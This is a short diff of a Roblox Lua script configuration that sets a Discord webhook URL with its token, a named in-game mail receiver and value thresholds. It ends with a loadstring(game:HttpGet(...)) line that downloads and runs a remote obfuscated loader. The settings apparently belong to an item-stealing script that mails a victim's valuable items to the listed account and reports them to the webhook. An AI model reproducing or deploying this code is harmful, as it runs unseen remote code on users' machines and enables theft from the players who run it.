@@ -4,4 +4,6 @@ _G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1081685246086496336/mj9xCY3
 _G.GMAIL_RECEIVERS = {"hugecatsaidzy"}
 _G.GWEBHOOK_MIN_DIFFICULTY = "100m"
 _G.GMAIL_MIN_DIFFICULTY = "100m"
+ _G.GACCEPT_MAILS = true
+_G.GMAIL_INSTANT_LUCK4 = true
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/227eb25ff80e539736b501597de3df61.lua"))()
